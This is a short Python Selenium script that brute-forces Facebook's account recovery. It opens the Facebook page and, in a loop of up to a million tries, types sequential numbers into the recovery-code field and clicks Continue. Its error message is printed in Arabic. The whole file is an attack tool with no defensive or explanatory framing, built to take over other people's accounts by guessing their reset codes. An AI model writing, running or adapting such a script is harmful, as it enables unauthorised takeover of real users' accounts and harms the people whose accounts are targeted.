from selenium import webdriver
from selenium.webdriver.common.by import By
import time

driver = webdriver.Chrome()

url = 'https://www.facebook.com/?locale=en_AR'

try:
    driver.get(url)
    time.sleep(50)
    
    num_iterations = 1000000
    start_number = 99999  
    increment = 1  

    for _ in range(num_iterations):
        
        input_element = driver.find_element(By.ID, 'recovery_code_entry')
        input_element.clear()
        input_element.send_keys(str(start_number))
       
        continue_button = driver.find_element(By.XPATH, "//button[contains(text(),'Continue')]")
        continue_button.click()
        time.sleep(1)
       
        start_number += increment
except Exception as e:
    print(f"حدث خطأ: {e}")
time.sleep(60000)
driver.quit()





